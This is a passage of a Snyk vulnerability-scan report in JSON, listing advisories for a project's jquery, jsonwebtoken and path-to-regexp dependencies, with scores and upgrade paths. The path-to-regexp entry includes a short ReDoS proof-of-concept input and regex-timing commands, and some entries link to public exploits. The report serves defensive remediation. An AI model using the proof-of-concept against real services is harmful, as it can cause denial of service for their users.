            "title": "Vulnerable Code"
          },
          {
            "url": "https://www.exploit-db.com/exploits/49766",
            "title": "Exploit DB"
          },
          {
            "url": "https://github.com/0xAJ2K/CVE-2020-11022-CVE-2020-11023",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:48:14.383890Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2025-09-26T09:55:13.621978Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:F/RL:O/RC:R",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-11-04T13:57:01.985856Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:48:14.383890Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-26T09:55:13.621978Z"
          }
        ],
        "description": "## Overview\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html(), .append()`, and others) may execute untrusted code.\n## Remediation\nUpgrade `jquery` to version 3.5.0 or higher.\n## References\n- [GHSA](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n- [JQuery 3.5.0 Release](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n- [JQuery Upgrade Guide](https://jquery.com/upgrade-guide/3.5/)\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n- [Security Blog](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html)\n- [Vulnerable Code](https://github.com/Athlon1600/youtube-downloader/blob/215b2b74f5eea5a1e8c1b9ada28c72ca35e5ab4f/public/index.html#L6)\n- [Exploit DB](https://www.exploit-db.com/exploits/49766)\n- [PoC in GitHub](https://github.com/0xAJ2K/CVE-2020-11022-CVE-2020-11023)\n",
        "epssDetails": {
          "percentile": "0.95676",
          "probability": "0.22783",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-11022"
          ],
          "CWE": [
            "CWE-79"
          ],
          "NSP": [
            "1518"
          ],
          "GHSA": [
            "GHSA-gxr4-xjj5-5px2",
            "GHSA-v73w-r9xg-7cr9"
          ]
        },
        "packageName": "jquery",
        "proprietary": false,
        "creationTime": "2020-04-30T12:29:39.885866Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-04-29T23:02:09Z",
        "exploitDetails": {
          "sources": [
            "ExploitDB",
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-04-29T23:02:09Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-09-26T09:55:13.621978Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jquery@3.3.1"
        ],
        "upgradePath": [
          false,
          "jquery@3.5.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jquery",
        "version": "3.3.1"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180022",
        "title": "Improper Authentication",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 7.6,
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:44.867775Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:56.598442Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Authentication such that the lack of algorithm definition in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. \r\n\r\n## Exploitability\r\nUsers are affected only if all of the following conditions are true for the `jwt.verify()` function:\r\n\r\n1) A token with no signature is received.\r\n\r\n2) No algorithms are specified.\r\n\r\n3) A falsy (e.g., `null`, `false`, `undefined`) secret or key is passed.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.02483",
          "probability": "0.00016",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23540"
          ],
          "CWE": [
            "CWE-287"
          ],
          "GHSA": [
            "GHSA-qwph-4952-7xr6"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:09:36.072853Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:59Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:13:25.290846Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:56.598442Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jsonwebtoken@8.3.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "8.3.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180024",
        "title": "Improper Restriction of Security Token Assignment",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 6.3,
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.676121Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.050914Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Improper Restriction of Security Token Assignment via the `secretOrPublicKey ` argument due to misconfigurations of the key retrieval function `jwt.verify()`. Exploiting this vulnerability might result in incorrect verification of forged tokens when tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm.\r\n\r\n**Note:**\r\nThis vulnerability affects your application if it supports the usage of both symmetric and asymmetric keys in `jwt.verify()` implementation with the same key retrieval function.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.14801",
          "probability": "0.00049",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23541"
          ],
          "CWE": [
            "CWE-1259"
          ],
          "GHSA": [
            "GHSA-hjrf-2m68-5959"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:14:27.155728Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:33:19Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T09:16:03.621406Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.050914Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jsonwebtoken@8.3.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "8.3.0"
      },
      {
        "id": "SNYK-JS-JSONWEBTOKEN-3180026",
        "title": "Use of a Broken or Risky Cryptographic Algorithm",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<9.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "9.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.8,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jsonwebtoken",
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0",
            "title": "GitHub Release"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 8.1,
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:27.935665Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:54.264450Z"
          }
        ],
        "description": "## Overview\n[jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) is a JSON Web Token implementation (symmetric and asymmetric)\n\nAffected versions of this package are vulnerable to Use of a Broken or Risky Cryptographic Algorithm such that the library can be misconfigured to use legacy, insecure key types for signature verification. For example, DSA keys could be used with the RS256 algorithm. \r\n\r\n## Exploitability\r\n\r\nUsers are affected when using an algorithm and a key type _other_ than the combinations mentioned below:\r\n\r\nEC: ES256, ES384, ES512\r\n                  \r\nRSA: RS256, RS384, RS512, PS256, PS384, PS512 \r\n\r\nRSA-PSS: PS256, PS384, PS512                      \r\n\r\nAnd for Elliptic Curve algorithms:\r\n\r\nES256: prime256v1\r\n\r\nES384: secp384r1\r\n\r\nES512:  secp521r1 \r\n\r\n## Workaround \r\n\r\nUsers who are unable to upgrade to the fixed version can use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility.\n## Remediation\nUpgrade `jsonwebtoken` to version 9.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3)\n- [GitHub Release](https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0)\n",
        "epssDetails": {
          "percentile": "0.18523",
          "probability": "0.00058",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-23539"
          ],
          "CWE": [
            "CWE-327"
          ],
          "GHSA": [
            "GHSA-8cf7-32gw-wr33"
          ]
        },
        "packageName": "jsonwebtoken",
        "proprietary": false,
        "creationTime": "2022-12-22T09:19:03.430735Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-22T03:32:22Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-12-22T10:32:50.173080Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:54.264450Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jsonwebtoken@8.3.0"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@9.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jsonwebtoken",
        "version": "8.3.0"
      },
      {
        "id": "SNYK-JS-PATHTOREGEXP-7925106",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "Blake Embrey"
        ],
        "semver": {
          "vulnerable": [
            "<0.1.10",
            ">=0.2.0 <1.9.0",
            ">=2.0.0 <3.3.0",
            ">=4.0.0 <6.3.0",
            ">=7.0.0 <8.0.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "0.1.10",
          "1.9.0",
          "3.3.0",
          "6.3.0",
          "8.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "path-to-regexp",
        "references": [
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/f73ec6c86b06f544b977119c2b62a16de480a6a9",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0",
            "title": "Strict Mode Release Note"
          },
          {
            "url": "https://blakeembrey.com/posts/2024-09-web-redos/",
            "title": "Vulnerability Write-up"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-09-10T13:33:00.998289Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-16T06:59:36.219457Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-16T06:59:36.219457Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-09-10T13:33:00.998289Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when including multiple regular expression parameters in a single segment, which will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`, if two parameters within a single segment are separated by a character other than a `/` or `.`. Poor performance will block the event loop and can lead to a DoS.\r\n\r\n**Note:**\r\nWhile the 8.0.0 release has completely eliminated the vulnerable functionality, prior versions that have received the patch to mitigate backtracking may still be vulnerable if custom regular expressions are used. So it is strongly recommended for regular expression input to be controlled to avoid malicious performance degradation in those versions. This behavior is enforced as of version 7.1.0 via the `strict` option, which returns an error if a dangerous regular expression is detected.\r\n\r\n## Workaround\r\nThis vulnerability can be avoided by using a custom regular expression for parameters after the first in a segment, which excludes `-` and `/`.\n## PoC\n```js\r\n/a${'-a'.repeat(8_000)}/a\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `path-to-regexp` to version 0.1.10, 1.9.0, 3.3.0, 6.3.0, 8.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f)\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6)\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/f73ec6c86b06f544b977119c2b62a16de480a6a9)\n- [Strict Mode Release Note](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0)\n- [Vulnerability Write-up](https://blakeembrey.com/posts/2024-09-web-redos/)\n",
        "epssDetails": {
          "percentile": "0.38501",
          "probability": "0.00167",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-45296"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-9wv6-86v2-598j"
          ]
        },
        "packageName": "path-to-regexp",
        "proprietary": false,
        "creationTime": "2024-09-10T06:12:52.186963Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-09-09T19:40:10Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-09-10T08:00:38.971163Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-16T06:59:36.219457Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "path-to-regexp@1.8.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "path-to-regexp@1.9.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "path-to-regexp",
        "version": "1.8.0"
      }
    ],
    "ok": false,
    "dependencyCount": 151,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "yarn",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "53 vulnerable dependency paths",
    "remediation": {
      "unresolved": [
        {
          "id": "SNYK-JS-PATHTOREGEXP-7925106",
          "title": "Regular Expression Denial of Service (ReDoS)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
          "credit": [
            "Blake Embrey"
          ],
          "semver": {
            "vulnerable": [
              "<0.1.10",
              ">=0.2.0 <1.9.0",
              ">=2.0.0 <3.3.0",
              ">=4.0.0 <6.3.0",
              ">=7.0.0 <8.0.0"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "0.1.10",
            "1.9.0",
            "3.3.0",
            "6.3.0",
            "8.0.0"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.9,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "path-to-regexp",
          "references": [
            {
              "url": "https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/pillarjs/path-to-regexp/commit/f73ec6c86b06f544b977119c2b62a16de480a6a9",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0",
              "title": "Strict Mode Release Note"
            },
            {
              "url": "https://blakeembrey.com/posts/2024-09-web-redos/",
              "title": "Vulnerability Write-up"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "Red Hat",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-09-10T13:33:00.998289Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.9,
              "cvssVersion": "4.0",
              "modificationTime": "2025-06-16T06:59:36.219457Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2025-06-16T06:59:36.219457Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
              "assigner": "Red Hat",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
